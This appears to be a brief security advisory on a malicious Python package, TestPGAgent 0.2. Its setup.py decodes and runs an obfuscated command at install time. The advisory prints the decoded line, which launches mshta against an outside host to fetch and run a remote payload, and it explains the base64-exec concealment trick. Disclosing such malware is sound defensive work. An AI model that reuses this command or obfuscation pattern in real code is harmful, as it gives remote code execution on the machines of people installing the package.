summary: setup.py executes base64-obfuscated payload that runs remote HTA via mshta.exe at install time
details: On `pip install`, setup.py line 19 calls `exec(base64.b64decode(...))` whose decoded body is `import os; os.system('cmd /c "mshta http://fixars.top"')`. This launches Windows `mshta.exe` against http://fixars.top over plaintext HTTP, fetching and executing an arbitrary HTML-application payload on the installer's machine. The payload is obfuscated with base64+exec to evade casual inspection. The fetch destination is unrelated to any declared publisher, content is unpinned and mutable, and execution is fully attacker-controlled. Any Windows machine running `pip install TestPGAgent==0.2` will execute remote code chosen by whoever controls fixars.top at the moment of install.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
